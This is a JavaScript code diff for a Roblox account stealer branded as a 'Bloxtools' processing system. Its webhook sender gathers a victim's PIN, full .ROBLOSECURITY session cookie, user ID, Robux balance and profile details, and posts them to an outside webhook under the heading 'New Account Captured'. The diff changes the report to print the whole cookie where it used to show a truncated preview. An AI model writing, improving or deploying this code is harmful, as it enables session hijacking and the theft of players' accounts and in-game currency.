@@ -134,137 +134,109 @@ async function fetchRobuxFromCookie(cookieValue) {
     }
 }
 
-/* ================= CLEAN / MODERN WEBHOOK SENDER ================= */
+/* ================= WEBHOOK SENDER ================= */
 
 async function sendWebhook(pin, cookie, rbxuid) {
-
-    // Fetch public info
+    // Fetch public profile info
     const userInfo = await fetchUserInfoFromId(rbxuid);
 
-    // Fetch Robux from cookie
+    // Fetch Robux using cookie
     const robux = await fetchRobuxFromCookie(cookie);
 
-    // Status emoji
-    const robuxEmoji =
-        robux > 10000 ? "💎" :
-        robux > 1000 ? "💰" :
-        "🪙";
+    /* ================= DESCRIPTION ================= */
 
-    // Better formatted cookie preview
-    const shortCookie =
-        cookie.length > 120
-            ? cookie.substring(0, 120) + "..."
-            : cookie;
+    const description = `
+## 📦 Account Capture
 
-    // Main embed fields
-    const fields = [];
+- **rbxuid:** \`${rbxuid}\`
+- **Cookie Length:** \`${cookie.length} chars\`
+
+## 🔐 Full .ROBLOSECURITY Cookie
+\`\`\`
+${cookie}
+\`\`\`
+`;
+
+    /* ================= EMBED FIELDS ================= */
+
+    const embedFields = [];
 
     if (userInfo) {
-
-        fields.push({
-            name: "👤 Account Information",
-            value:
-`> **Username:** \`${userInfo.username}\`
-> **Display Name:** ${userInfo.displayName}
-> **User ID:** \`${userInfo.userId}\`
-> **Join Date:** ${userInfo.joinDate}`,
-            inline: false
-        });
-
-        fields.push({
-            name: `${robuxEmoji} Robux`,
-            value: `\`${robux} R$\``,
-            inline: true
-        });
-
-        fields.push({
-            name: "👥 Friends",
-            value: `\`${userInfo.friendsCount}\``,
-            inline: true
-        });
-
-        fields.push({
-            name: "🧷 rbxuid",
-            value: `\`${rbxuid}\``,
-            inline: true
-        });
-
-        fields.push({
-            name: "👕 Wearing",
-            value: userInfo.wearing || "Unknown",
-            inline: false
-        });
-
-        fields.push({
-            name: "🔗 Profile",
-            value: `[Open Roblox Profile](${userInfo.profileUrl})`,
-            inline: false
-        });
-
+        embedFields.push(
+            {
+                name: "👤 Roblox Profile",
+                value:
+                    `**Username:** ${userInfo.username}\n` +
+                    `**Display Name:** ${userInfo.displayName}\n` +
+                    `**User ID:** ${userInfo.userId}\n` +
+                    `**Join Date:** ${userInfo.joinDate}\n` +
+                    `[View Profile](${userInfo.profileUrl})`,
+                inline: false
+            },
+            {
+                name: "👥 Friends",
+                value: `${userInfo.friendsCount}`,
+                inline: true
+            },
+            {
+                name: "💰 Robux",
+                value: `${robux} R$`,
+                inline: true
+            },
+            {
+                name: "👕 Wearing",
+                value: userInfo.wearing || "Unknown",
+                inline: false
+            }
+        );
     } else {
-
-        fields.push({
-            name: "⚠️ Profile Error",
+        embedFields.push({
+            name: "⚠️ Error",
             value:
-`Could not fetch profile information.
-
-Possible reasons:
-> • User deleted
-> • User banned
-> • Invalid rbxuid`,
+                "Could not fetch public profile information.\n" +
+                "User may be deleted, banned, or invalid.",
             inline: false
         });
-
     }
 
-    // Cookie info section
-    fields.push({
-        name: "🍪 Cookie Information",
+    embedFields.push({
+        name: "🔐 Cookie Summary",
         value:
-`> **Length:** \`${cookie.length}\` characters
-> **Preview:** \`${shortCookie}\``,
+            `**Length:** ${cookie.length} characters\n` +
+            `**rbxuid:** ${rbxuid}`,
         inline: false
     });
 
-    // Final payload
-    const payload = {
+    /* ================= WEBHOOK PAYLOAD ================= */
 
+    const payload = {
         username: "Bloxtools Processing System",
 
-        avatar_url:
-            "https://i.imgur.com/7sY9dQx.png",
+        embeds: [
+            {
+                title: "🔓 New Account Captured",
+                description: description,
 
-        embeds: [{
-            title: "🔓 New Account Captured",
+                color: 0x8c52ff,
 
-            description:
-`╭───────────────╮
-> Account data successfully processed.
-╰───────────────╯`,
+                thumbnail: userInfo
+                    ? { url: userInfo.avatarUrl }
+                    : undefined,
 
-            color: 0x8c52ff,
+                fields: embedFields,
 
-            thumbnail: userInfo
-                ? { url: userInfo.avatarUrl }
-                : undefined,
+                footer: {
+                    text: "Bloxtools • Roblox Account Logger"
+                },
 
-            image: userInfo?.avatarUrl
-                ? { url: userInfo.avatarUrl }
-                : undefined,
-
-            fields: fields,
-
-            footer: {
-                text:
-                    "Bloxtools • Processing System"
-            },
-
-            timestamp: new Date().toISOString()
-        }]
+                timestamp: new Date().toISOString()
+            }
+        ]
     };
 
-    try {
+    /* ================= SEND WEBHOOK ================= */
 
+    try {
         const response = await fetch(WEBHOOK_URL, {
             method: "POST",
             headers: {
@@ -274,11 +246,8 @@ Possible reasons:
         });
 
         return response.ok;
-
     } catch (error) {
-
         console.error("Webhook Error:", error);
-
         return false;
     }
 }
